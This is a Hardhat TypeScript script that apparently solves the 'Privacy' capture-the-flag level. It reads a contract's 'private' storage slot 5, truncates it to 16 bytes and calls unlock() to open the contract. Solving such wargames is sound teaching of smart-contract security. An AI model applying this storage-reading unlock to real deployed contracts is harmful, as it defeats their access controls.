import { ethers } from "hardhat";
import { Privacy } from "../typechain-types";

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const BYTES: number = 32;
const PREFIX: number = 2;

const main = async (): Promise<void> => {
  const privacyAddress = "0xb6D728e30C0BFe06ceABC0993035C7478a24b036";
  const privacy: Privacy = await ethers.getContractAt("Privacy", privacyAddress);

  const dataBytesArray = (await ethers.provider.getStorageAt(privacyAddress, 5)).slice(0, PREFIX + BYTES);
  
  console.log(`🔒 Status locked: ${await privacy.locked() ? 'Yes' : 'No'}`)
  await privacy.unlock(dataBytesArray);
  await delay(5000);
  console.log(`🔓 Status locked: ${await privacy.locked() ? 'Yes' : 'No'}`)
};

main().catch(error => {
  console.error('🚫', error);
});
